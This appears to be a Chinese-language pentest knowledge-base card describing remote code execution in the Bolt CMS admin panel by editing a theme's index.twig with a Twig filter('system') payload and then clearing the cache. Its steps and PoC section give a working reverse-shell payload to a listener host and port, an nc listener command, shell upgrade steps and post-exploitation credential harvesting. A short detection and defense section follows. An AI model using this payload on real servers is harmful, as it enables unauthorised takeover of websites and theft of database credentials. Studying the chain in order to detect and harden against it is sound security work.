---
id: web-generic-ssti-boltcms-admin-template-edit-twig-filter-system-rce
title: Bolt CMS 后台主题模板编辑改 index.twig + 清除缓存触发 Twig filter('system') 命令执行
type: scenario
domain: web
path: web/generic/ssti
technique: boltcms-admin-template-edit-twig-filter-system-rce
aliases:
- Bolt CMS 模板 RCE
- Bolt CMS Twig SSTI
- index.twig filter('system')
- Bolt 清缓存 代码执行
- Bolt CMS 后台 getshell
tags:
- boltcms
- twig
- ssti
- template-edit
- php
- rce
- admin-panel
- cache-clear
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V630
  verified_at: '2026-11-12T23:42:37+08:00'
  notes: 已对照原文与61张图核对：图29-31确认 Bolt v5.1.3 后台 File management→themes/base-2021；图36-37确认 index.twig 插入 {{['id']|filter('system')}} 并回显 uid=33(www-data)；图38-39确认 8888 端口 bash 反弹获得 www-data shell；图34-35确认必须 Maintenance→Clear cache 后首页才重新编译触发。PoC 采用可解析的嵌套双引号形式（截图原样单引号嵌套存在歧义），与 8888 回连结果一致；后台凭据来自 omv 备份泄露与原文相符。Bolt 5.1.3 为目标版本非受影响区间，未设 affected_versions；无 CVE。dedup 最高候选为通用 Twig filter 回调原语（不同入口/完整链），OTCMS/MCMS/FastCMS/Joomla 等为各 CMS 独立卡，非同链。未在本机复跑；frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

Bolt CMS（PHP/Twig）的管理员可在后台 `File management → themes/<theme>/index.twig` 直接编辑主题模板；把 `{{['bash -c "bash -i >& /dev/tcp/<ip>/<port> 0<&1"']|filter('system')}}` 或 `{{['id']|filter('system')}}` 插入模板并保存后，到 `Maintenance → Clear cache` 清一次模板缓存，再访问首页触发 Twig 重新编译执行，即可在 Web 进程（如 www-data）权限下执行任意系统命令。即使后台“上传设置”不允许 php 后缀，模板编辑器本身就是一条完整的代码执行路径。

## 原理

- **Bolt CMS 与 Twig**：Bolt 是 PHP CMS，前台/后台模板由 Twig 渲染；后台提供文件管理与主题模板编辑器，管理员可直接修改 `themes/<theme>/*.twig` 并保存。
- **Twig `filter` 过滤器**：Twig 的 `|filter` 可对数组每个元素应用一个 PHP callable；`filter('system')` 会把数组元素作为参数调用 PHP `system()`。模板是管理员可编辑的代码，因而等价于任意 PHP 函数调用/命令执行。
- **为什么必须清缓存**：Twig 会把模板编译成 PHP 缓存文件；直接保存模板后请求仍使用旧编译结果，页面看不到变化。Bolt 后台 `Maintenance → Clear cache` 清掉编译缓存后，下一次访问重新编译模板，注入的表达式才执行。
- **与上传路径的区别**：Bolt 的 `accept_file_types` 默认允许 `twig/html/js/css` 等但不含 `php`，因此直接上传 PHP 不可执行；编辑主题模板是更直接的落点。配置文件 `config/config.yaml` 在目标环境中可能只读，但主题目录通常可写。
- **前置**：拿到 Bolt 管理员会话（弱口令、复用泄露凭据、其他认证缺陷）；后台模板编辑器可用且主题目录可写；能触发清缓存与首页渲染。

## 触发条件

- 目标为 Bolt CMS（如 v5.x），后台 `/bolt` 可登录。
- 攻击者持有管理员口令或可伪造管理员会话。
- 后台允许编辑主题模板（主题目录对 Web 用户可写）。
- 可访问 `Maintenance → Clear cache` 或能通过其他方式使模板缓存失效。
- 目标 PHP 未禁用 `system`/`filter` 相关函数（默认未禁用）。

## 利用步骤

1. 用管理员账号登录 `http://target/bolt`（本例凭据来自泄露的备份文件），确认 Bolt 版本与当前主题（如 `base-2021`）。
2. 打开 `File management → themes/base-2021/index.twig`（或任意会被渲染的模板）。
3. 在模板顶部插入 Payload（示例）：
   `{{['bash -c "bash -i >& /dev/tcp/10.10.14.2/8888 0<&1"']|filter('system')}}`
   或先验证 `{{['id']|filter('system')}}`。
4. `Save changes`；进入 `Maintenance → Clear cache` 点击清理，等待提示成功。
5. 攻击机 `nc -lnvp 8888`，访问站点首页；Twig 编译并执行 payload，获得 www-data shell。
6. 若 shell 不稳定，可用 `script /dev/null -c bash` 获取交互 TTY；随后在 `/var/www/...` 收集配置、数据库凭据与容器信息。

## PoC

```twig
{# 插入 themes/<theme>/index.twig 顶部 #}
{{['id']|filter('system')}}
{{['bash -c "bash -i >& /dev/tcp/10.10.14.2/8888 0<&1"']|filter('system')}}
```

```text
后台路径：/bolt → File management → themes/base-2021/index.twig → Save
Maintenance → Clear cache → 访问 / 触发
```

## 变体与关联

- 通用 Twig SSTI 的过滤器回调原理见 [[web-generic-ssti-twig-filter-map-reduce-callback-rce]]；本卡是 Bolt CMS 后台模板编辑这一具体入口 + 必须清缓存的完整操作链。
- 其他 CMS 后台模板编辑 RCE：OTCMS Smarty [[web-generic-ssti-otcms-admin-template-smarty-rce]]、MCMS FreeMarker [[web-generic-ssti-mcms-template-edit-freemarker-rce]]、FastCMS FreeMarker [[web-generic-ssti-fastcms-template-edit-freemarker-rce]]、Joomla 模板编辑器写 WebShell [[web-php-rce-joomla-admin-template-editor-webshell]]。
- 变体：若 `filter` 被禁用，可尝试 Twig 其他回调/对象方法（`map`、`reduce`、`sort` 等）或 Bolt 插件/扩展点；上传允许 `twig` 时可结合模板包含路径写入并被渲染。
- 变体：不同主题的模板文件、`partials/*.twig`、404/首页模板都可作为落点；清缓存也可由访问触发（视配置）或删除 `var/cache` 实现。

## 检测与防御

- **检测**：监控 `themes/**/*.twig` 的修改与 mtime；模板中出现 `|filter(`、`system`、`exec`、`passthru`、`shell_exec`、`{{` 嵌套可疑表达式；管理员异常登录与清缓存操作；Web 进程派生 `bash/sh` 或异常外联。
- **防御**：管理员强口令/2FA、限制 `/bolt` 来源 IP；生产环境收紧主题目录写权限或关闭后台模板编辑器；禁止在模板中使用可回调任意 PHP 函数的过滤器（自定义 Twig 环境白名单）；定期比对主题文件哈希；WAF 拦截含 `filter('system')` 等模板注入特征。
